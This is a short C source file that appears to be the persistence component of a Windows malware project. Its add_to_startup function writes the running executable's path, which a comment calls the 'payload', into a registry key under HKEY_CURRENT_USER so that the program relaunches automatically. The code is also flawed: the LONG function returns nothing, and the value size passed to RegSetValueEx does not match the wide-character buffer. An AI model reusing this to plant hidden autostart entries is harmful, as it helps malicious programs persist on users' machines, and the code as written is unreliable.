#include "constants.h"
#include "registry.h"
#include <Windows.h>

// Creates a registry entry and sets its value to the current payload path.
LONG add_to_startup() {
	HKEY hkey;
	const LONG err = RegCreateKeyEx(HKEY_CURRENT_USER, LP_SUB_KEY, 0, NULL,
		REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkey, NULL);

	if (!err) {
		WCHAR executable_path[MAX_PATH];
		GetModuleFileName(NULL, executable_path, MAX_PATH);

		RegSetValueEx(hkey, NULL, 0, REG_SZ, (BYTE*)executable_path, MAX_PATH);
		RegCloseKey(hkey);
	}
}
